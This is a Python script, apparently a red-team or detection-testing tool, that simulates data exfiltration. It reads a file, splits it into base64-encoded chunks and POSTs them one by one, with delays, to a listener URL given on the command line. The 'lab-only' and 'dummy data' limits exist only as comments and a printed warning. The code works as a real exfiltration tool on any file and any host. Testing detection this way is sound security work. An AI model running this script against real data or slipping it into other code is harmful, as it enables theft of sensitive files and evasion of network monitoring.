"""
Data exfil simulation (lab-only, dummy data).
Simulates chunked exfil over HTTP POST to a lab listener you control.
"""

from __future__ import annotations

import argparse
import base64
import json
import time
import urllib.request


def load_dummy(path: str) -> bytes:
    """
    Load dummy data from file for exfiltration simulation.
    
    Args:
        path: Path to dummy data file.
        
    Returns:
        File contents as bytes.
        
    Raises:
        FileNotFoundError: If file does not exist.
    """
    with open(path, "rb") as f:
        return f.read()


def send_chunk(url: str, chunk: bytes, delay: float, idx: int) -> None:
    """
    Send a chunk of data via HTTP POST to exfiltration endpoint.
    
    Encodes chunk as base64 and sends as JSON payload with index.
    Includes delay between chunks to simulate realistic exfiltration.
    
    Args:
        url: Target URL for exfiltration endpoint.
        chunk: Data chunk to send (bytes).
        delay: Delay in seconds after sending chunk.
        idx: Chunk index number.
        
    Raises:
        urllib.error.URLError: If HTTP request fails.
    """
    payload = json.dumps({"i": idx, "data": base64.b64encode(chunk).decode()}).encode()
    req = urllib.request.Request(url, data=payload, method="POST", headers={"Content-Type": "application/json"})
    with urllib.request.urlopen(req, timeout=5):  # noqa: S310
        pass
    time.sleep(delay)


def main() -> None:
    parser = argparse.ArgumentParser(description="Exfil simulation to a lab listener you control.")
    parser.add_argument("--url", required=True, help="Lab listener URL (owned/authorized).")
    parser.add_argument("--file", required=True, help="Dummy data file to exfil (lab-only).")
    parser.add_argument("--chunk-size", type=int, default=512, help="Chunk size bytes.")
    parser.add_argument("--delay", type=float, default=0.2, help="Delay between chunks.")
    args = parser.parse_args()

    print("⚠️  Lab-only. Point to a listener you control. Use dummy data only.")
    data = load_dummy(args.file)
    for i in range(0, len(data), args.chunk_size):
        chunk = data[i : i + args.chunk_size]
        send_chunk(args.url, chunk, args.delay, i // args.chunk_size)
    print("[+] Exfil simulation complete.")


if __name__ == "__main__":
    main()
